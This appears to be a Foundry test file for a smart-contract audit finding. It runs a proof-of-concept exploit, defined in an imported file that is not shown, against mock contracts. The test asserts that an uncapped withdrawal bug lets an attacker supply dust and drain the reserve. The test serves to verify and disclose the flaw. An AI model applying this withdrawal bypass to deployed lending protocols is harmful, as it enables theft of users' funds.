// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, MoneyMarket, Liquidity, MiniToken} from "./65649-fluid-processnormalsupplyaction-permits-an-uncapped-withdrawal.sol";

// Fluid DEX v2 H-1 (finding 65649): _processNormalSupplyAction's withdraw branch
// caps withdrawAmountRaw_ to the user's supply but never re-caps supplyAmount_,
// so LIQUIDITY.operate transfers the full uncapped amount. Supply 1e6 -> withdraw 1000e18.
contract Finding65649Test is Test {
    function test_exploit_uncappedWithdrawal_drainsReserve() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("supplied (dust)", e.suppliedByAttacker());
        emit log_named_uint("withdrawn", e.withdrawnByAttacker());
        emit log_named_uint("profit (drained)", e.profit());

        assertEq(e.suppliedByAttacker(), 1e6, "attacker supplied only 1e6");
        assertEq(e.withdrawnByAttacker(), 1000 ether, "attacker withdrew full uncapped 1000e18");
        assertGt(e.profit(), 1e6 * 1000, "reserve drained far beyond supply");
    }
}
